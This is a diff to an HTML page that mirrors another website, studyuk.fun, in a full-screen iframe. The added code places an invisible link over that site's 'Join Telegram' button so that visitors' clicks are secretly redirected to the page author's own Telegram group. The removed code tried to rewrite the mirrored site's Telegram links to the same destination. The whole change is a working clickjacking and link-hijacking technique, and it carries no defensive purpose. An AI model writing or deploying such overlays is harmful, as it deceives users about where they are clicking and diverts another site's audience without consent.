@@ -36,38 +36,45 @@
       top: 20px;
       left: 20px;
     }
-    .btn:hover {
-      background-color: #0056b3;
+
+    .overlay-link {
+      position: fixed;
+      z-index: 9998;
+      top: 55%; /* adjust to match "Join Telegram" image position */
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 220px; /* Approx width of their button */
+      height: 60px;
     }
+
+    .overlay-link a {
+      display: block;
+      width: 100%;
+      height: 100%;
+      opacity: 0; /* invisible */
+    }
+
   </style>
 </head>
 <body>
 
-  <!-- Join Buttons -->
+  <!-- Floating Top Buttons -->
   <button class="btn" id="join-btn-left" onclick="window.open('https://t.me/+rc5Psv_S2VJkMGM1', '_blank')">Join TG</button>
   <button class="btn" id="join-btn-right" onclick="window.open('https://t.me/MockManager', '_blank')">Contact Me</button>
 
   <!-- Mirror -->
   <iframe id="mirror" src="https://studyuk.fun"></iframe>
 
+  <!-- Overlay over "Join Telegram" image -->
+  <div class="overlay-link">
+    <a href="https://t.me/+rc5Psv_S2VJkMGM1" target="_blank"></a>
+  </div>
+
   <script>
-    // Refresh every 60 seconds
+    // Reload iframe every 60 seconds
     setInterval(() => {
       document.getElementById('mirror').src = 'https://studyuk.fun';
     }, 60000);
-
-    // Replace inner Telegram links when iframe loads
-    document.getElementById('mirror').onload = () => {
-      const iframe = document.getElementById('mirror').contentWindow;
-      try {
-        const links = iframe.document.querySelectorAll('a[href*="t.me"]');
-        links.forEach(link => {
-          link.href = "https://t.me/+rc5Psv_S2VJkMGM1";
-        });
-      } catch (err) {
-        console.log("Cross-origin content, direct link override blocked. Using overlay buttons instead.");
-      }
-    };
   </script>
 
 </body>
